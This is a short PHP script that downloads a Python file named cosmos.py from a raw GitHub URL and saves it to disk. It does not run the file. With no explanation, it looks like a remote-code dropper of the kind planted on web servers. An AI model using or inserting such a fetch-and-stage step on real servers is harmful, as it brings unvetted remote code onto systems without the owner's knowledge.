<?php
$cosmos = file_get_contents("https://raw.githubusercontent.com/onix-x/linuxoid/master/cosmos.py");
$file = fopen("cosmos.py", "w");
fwrite($file, $cosmos);
fclose($file); 
?>
